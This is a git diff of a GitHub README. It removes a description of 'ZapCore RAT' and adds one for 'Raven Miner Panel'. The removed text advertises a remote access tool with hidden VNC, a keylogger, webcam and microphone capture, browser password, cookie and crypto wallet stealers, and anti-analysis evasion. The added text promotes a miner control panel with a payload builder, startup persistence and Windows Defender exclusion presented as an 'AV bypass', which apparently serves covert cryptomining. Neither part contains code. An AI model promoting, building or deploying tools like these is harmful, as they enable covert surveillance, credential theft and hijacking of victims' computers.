@@ -1,134 +1,260 @@
-# ZapCore
-ZapCore RAT
+# Raven Miner Panel
+
+<div align="center">
 
 
-Update : 1.0.7603
-![1](https://github.com/user-attachments/assets/4da5fb38-e8cd-4ef3-89ee-9aa0972492da)
-![image](https://github.com/user-attachments/assets/828ecc24-8f84-4c3e-975e-bbe690c29f96)
-![image](https://github.com/user-attachments/assets/024d4e76-c346-465b-973b-a510337172b0)
-![image](https://github.com/user-attachments/assets/a42bc181-cea9-4541-86d0-7c6610f66ee1)
-![image](https://github.com/user-attachments/assets/7806b3a6-202e-4935-af58-c254f60fc952)
-![image](https://github.com/user-attachments/assets/fea76969-9b57-4b63-903a-12bc49398bdf)
+![Raven Miner Panel](https://github.com/user-attachments/assets/d4eec337-12b8-4710-aa7a-946d07af8905)
 
+**The Ultimate Mining Control Center**
 
-# ZapCore 
+[![GitHub stars](https://img.shields.io/github/stars/yourusername/raven-miner-panel?style=for-the-badge&logo=github&color=black)](https://github.com/yourusername/raven-miner-panel/stargazers)
+[![GitHub forks](https://img.shields.io/github/forks/yourusername/raven-miner-panel?style=for-the-badge&logo=github&color=333)](https://github.com/yourusername/raven-miner-panel/network)
+[![License](https://img.shields.io/badge/license-MIT-black?style=for-the-badge)](LICENSE)
+[![Version](https://img.shields.io/badge/version-1.0%20Beta-red?style=for-the-badge)](https://github.com/yourusername/raven-miner-panel/releases)
+[![Delphi](https://img.shields.io/badge/Delphi-EE1F35?style=for-the-badge&logo=delphi&logoColor=white)](https://www.embarcadero.com/products/delphi)
 
-## Advanced Remote Administration Tool Zapcore 
-
-CONTACT : https://t.me/ZeroTraceDevOfficial
-
-
-
-
-*Developed by ZeroTrace*
-*Coded In : C# WPF *
-
-![zapcore-logo (2)](https://github.com/user-attachments/assets/5bd8cd48-584d-4a50-ae48-3299659bcc5c)
-
-
-## Overview
-
-ZapCore RAT is a powerful, feature-rich remote administration tool designed for seamless system control through encrypted socket connections. With an intuitive interface and comprehensive functionality, ZapCore provides system administrators and IT professionals with the tools needed for efficient remote management.
-
-## Key Features
-
-### Secure Communication
-- **End-to-End Encryption**: All data transmitted is secured with military-grade SHA-256 encryption
-- **Custom Mutex Implementation**: Prevents multiple instances for enhanced stability
-- **Secure Socket Layer**: Protected connection between client and server
-
-### Remote Control
-- **Hidden VNC Viewer**: Remote screen viewing and control without user awareness
-- **Remote Desktop**: Full interactive GUI-based remote control
-- **Process Manager**: View, terminate, and manage running processes
-- **Task Manager**: Advanced process management with detailed system information
-- **Registry Editor**: Remote registry viewing and modification capabilities
-
-### Monitoring Tools
-- **Keylogger**: Advanced keystroke logging with application tracking
-- **Screen Capture**: Periodic or on-demand screenshots
-- **Webcam Capture**: Remote camera access and image capture
-- **Audio Capture**: Microphone listening and recording capabilities
-- **Clipboard Monitoring**: Track and intercept clipboard content
-
-### Browsing & Credentials
-- **Password Recovery**: Latest Chrome v138 supported password extraction
-- **Cookie Harvester**: Extract and utilize browser cookies
-- **Browser History Viewer**: Access complete browsing history
-- **Autofill Data Extractor**: Capture stored form data
-
-### File Operations
-- **Advanced File Manager**: Complete remote file system access
-- **File Search**: Quickly locate files across the remote system
-- **File Transfer**: Bidirectional file uploads and downloads
-- **File Execution**: Remote launch of applications and scripts
-- **File Operations**: Copy, move, rename, and delete with permissions management
-
-### System Management
-- **Startup Manager**: Control applications that run at system boot
-- **Service Controller**: Manage Windows services remotely
-- **System Information**: Comprehensive hardware and software details
-- **Network Configuration**: View and modify network settings
-- **User Account Management**: Create, modify, and control user accounts
-
-### Stealer Functionality
-- **Crypto Wallet Scanner**: Detect and extract cryptocurrency wallet information
-- **FTP Credentials Extractor**: Recover stored FTP connection details
-- **Gaming Platform Credentials**: Extract login information from popular gaming platforms
-- **Messaging Application Data**: Access stored credentials from messaging applications
-- **Email Client Credentials**: Extract email account information
-
-### Advanced Controls
-- **Shell Access**: Execute command-line instructions with real-time output
-- **Power Management**: Shutdown, restart, log off, or put the system to sleep
-- **USB Monitoring**: Track USB device connections
-- **Printer Management**: Control and monitor printing operations
-- **Active Window Tracking**: Monitor currently used applications
-
-### Building & Deployment
-- **Custom Icon Integration**: Personalize client appearance
-- **Assembly Information Modification**: Customize file properties
-- **Anti-Analysis Protection**: Evade detection by security solutions
-- **Installation Options**: Configure self-installation paths (AppData/Temp)
-- **Startup Persistence**: Ensure client runs after system reboot
-
-### Management Features
-- **Multi-Client Management**: Control multiple systems simultaneously
-- **Client Grouping**: Organize controlled systems by categories
-- **Mass Task Execution**: Deploy commands to multiple clients at once
-- **Detailed Logging**: Track all remote activities with timestamp
-- **Connection Statistics**: Monitor bandwidth usage and connection health
-
-## Technical Specifications
-
-- **Framework**: .NET CORE
-- **Connectivity**: TCP/IP Sockets
-- **Compatibility**: Windows 7/8/10/11
-- **Encoding**: UTF-8 with custom packet structure
-- **Architecture Support**: x86 and x64 systems
-- **Requirements**: Microsoft .NET CORE 8.0+
-
-## Interface Preview
-
-The ZapCore  provides an elegant, intuitive interface with dark-themed styling for reduced eye strain during extended use sessions. Main components include:
-
-- Client Overview Panel: Displays all connected systems with essential information
-- Feature Selection Sidebar: Quick access to all available tools
-- Real-time Monitoring Dashboard: Live system statistics and activities
-- Tabbed Interface: Efficiently manage multiple remote operations simultaneously
-
-## Security Notice
-
-ZapCore is designed exclusively for legitimate system administration, authorized remote assistance, and educational purposes. Users are responsible for ensuring they have proper authorization before connecting to any system. Unauthorized access to computer systems is illegal and unethical.
+</div>
 
 ---
 
-*For research and educational purposes only. Always obtain proper authorization before using remote administration tools.*
+## ✨ **What is Raven Miner Panel?**
 
-**© ZeroTrace - All rights reserved**
+Raven Miner Panel is a powerful, open-source mining control system built with Delphi that gives you complete command over your mining operations. Control multiple systems remotely, monitor mining performance in real-time, and manage your entire mining farm from a single, intuitive interface.
+
+> *"Like a raven commanding its flock, Raven Miner Panel orchestrates your mining empire with precision and intelligence."*
+
+---
+
+## 🚀 **Key Features**
+
+<table>
+<tr>
+<td width="50%">
+
+### 🎯 **Remote Mining Control**
+- **Start/Stop Mining** - Instant control over mining operations
+- **Live Performance Monitoring** - Real-time hashrate and status updates
+- **Persistent State Management** - Server remembers which clients are mining
+- **Multi-Client Support** - Control hundreds of mining rigs simultaneously
+
+</td>
+<td width="50%">
+
+### 🔧 **Advanced Client Management**
+- **Dynamic Payload Building** - Create and deploy miners from server-side
+- **Automatic Startup** - Configure miners to start with Windows
+- **Windows Defender Exclusion** - Smart AV bypass for mining operations
+- **Reliable Communication** - Built on stable DZSockets architecture
+
+</td>
+</tr>
+</table>
+
+---
+
+## 📋 **Core Features Breakdown**
+
+### 🖥️ **Server-Side Control Panel**
+- **Multi-Client Dashboard** - Monitor all connected mining rigs at once
+- **Payload Builder** - Compile and distribute custom mining configurations
+- **State Persistence** - Automatic recovery of mining states after restarts
+- **Live Statistics** - Real-time mining performance metrics
+- **Command Queue** - Reliable command delivery system
+
+### 💻 **Client-Side Agent**
+- **Lightweight Footprint** - Minimal resource usage on mining systems
+- **Auto-Connect** - Persistent connection to control server
+- **Command Execution** - Instant response to server commands
+- **Status Reporting** - Continuous performance feedback
+- **Self-Protection** - Windows Defender exclusion management
+
+### 🛡️ **System Integration**
+- **Startup Integration** - Automatic launch with Windows
+- **WD Exclusion** - Intelligent antivirus bypass
+- **Process Management** - Clean start/stop of mining processes
+- **Network Resilience** - Auto-reconnection on network issues
+
+---
+
+## 📸 **Screenshots**
+
+<div align="center">
+
+### Server Control Panel
+![Server Panel](https://github.com/user-attachments/assets/2e7e58c1-0fe9-4693-8bb4-2760c406983c)
 
 
+### Live Mining Dashboard
+![Dashboard](https://github.com/user-attachments/assets/405486a0-3e76-4354-a446-684f91f3498b)
+
+</div>
+
+---
+
+## ⚡ **Quick Start Guide**
+
+### Prerequisites
+```
+• Windows 10/11
+• Delphi IDE (for compilation)
+• Administrative privileges (for WD exclusions)
+• Network connectivity between server and clients
+```
+
+### Server Setup
+
+```bash
+1. Download the latest release
+2. Extract Raven-Miner-Panel.exe
+3. Configure listening port (default: 8777)
+4. Run as Administrator
+5. Start accepting client connections
+```
 
 
+---
 
+## 🏗️ **Architecture**
 
+<div align="center">
+
+```
+    ┌─────────────────┐         ┌─────────────────┐
+    │  Raven Server   │◄────────┤   Client 1      │
+    │                 │         │   (Mining Rig)  │
+    │  • DZSockets    │         │                 │
+    │  • State Mgmt   │         │  • Auto-connect │
+    │  • Payload Gen  │         │  • Mining Ctrl  │
+    │  • Live Monitor │         │  • Status Report│
+    └─────────┬───────┘         └─────────────────┘
+              │
+              ├─────────────────┐ ┌─────────────────┐
+              │                 │ │   Client 2      │
+              │                 └►│   (Mining Rig)  │
+              │                   │                 │
+              │                   └─────────────────┘
+              │
+              └─────────────────┐ ┌─────────────────┐
+                                │ │   Client N      │
+                                └►│   (Mining Rig)  │
+                                  │                 │
+                                  └─────────────────┘
+```
+
+</div>
+
+---
+
+## 🛠️ **Technical Stack**
+
+<div align="center">
+
+| Component | Technology | Purpose |
+|-----------|------------|---------|
+| **Core Language** | ![Delphi](https://img.shields.io/badge/Delphi-EE1F35?style=for-the-badge&logo=delphi&logoColor=white) | Native Windows performance |
+| **Networking** | **DZSockets** | Stable client-server communication |
+| **Architecture** | **Client-Server** | Centralized mining control |
+| **Platform** | ![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white) | Native Windows integration |
+
+</div>
+
+---
+
+## 📚 **Documentation**
+
+### 🔧 Configuration
+- **Server Configuration** - Port settings, client limits, security options
+- **Payload Building** - Custom miner configuration and distribution
+
+### 📖 User Guides
+- **Getting Started** - Step-by-step setup guide
+- **Remote Control** - Managing mining operations
+- **Troubleshooting** - Common issues and solutions
+
+### 🏗️ Development
+- **Source Code Structure** - Codebase organization
+- **DZSockets Integration** - Network communication details
+- **State Management** - Client status persistence
+
+---
+
+## 🎯 **Use Cases**
+
+### 🏭 **Mining Farm Management**
+Perfect for managing large-scale mining operations across multiple locations with centralized control and monitoring.
+
+### 🏠 **Home Mining Setup**
+Ideal for enthusiasts running multiple mining rigs who want professional-grade control and monitoring.
+
+### 🔧 **System Administration**
+Excellent for IT professionals managing mining infrastructure with enterprise-level reliability.
+
+---
+
+## 🤝 **Contributing**
+
+We welcome contributions to make Raven Miner Panel even better! This is an open-source project built for the mining community.
+
+### How to Contribute
+
+1. **Fork** the repository
+2. **Create** a feature branch (`git checkout -b feature/awesome-mining-feature`)
+3. **Commit** your changes (`git commit -m 'Add awesome mining feature'`)
+4. **Push** to the branch (`git push origin feature/awesome-mining-feature`)
+5. **Open** a Pull Request
+
+### Development Setup
+```bash
+1. Install Delphi Community Edition (free)
+2. Clone the repository
+3. Open LoaderMain.dproj [ Server Side ]
+4. Open RavenOriginalStub.dproj [ Client Side ]
+4. Compile and test
+```
+
+---
+
+## 📊 **Project Status**
+
+<div align="center">
+
+![GitHub commit activity](https://img.shields.io/github/commit-activity/m/yourusername/raven-miner-panel?style=flat-square&color=black)
+![GitHub last commit](https://img.shields.io/github/last-commit/yourusername/raven-miner-panel?style=flat-square&color=black)
+![GitHub repo size](https://img.shields.io/github/repo-size/yourusername/raven-miner-panel?style=flat-square&color=black)
+![GitHub issues](https://img.shields.io/github/issues/yourusername/raven-miner-panel?style=flat-square&color=black)
+
+</div>
+
+---
+
+## ⚠️ **Beta Notice**
+
+Raven Miner Panel is currently in **1.0 Beta**. While stable and feature-complete, we're actively gathering feedback and making improvements. Please report any issues or suggestions!
+
+---
+
+## 📄 **License**
+
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+
+---
+
+## 🌟 **Support the Project**
+
+If Raven Miner Panel helps manage your mining operations, consider:
+
+- ⭐ **Starring** the repository
+- 🐛 **Reporting** bugs and issues  
+- 💡 **Suggesting** new features
+- 🔧 **Contributing** code improvements
+- 📢 **Sharing** with the mining community
+
+---
+
+<div align="center">
+
+**Built with ❤️ for the mining community**
+
+*Raven Miner Panel - Command Your Mining Empire*
+
+</div>
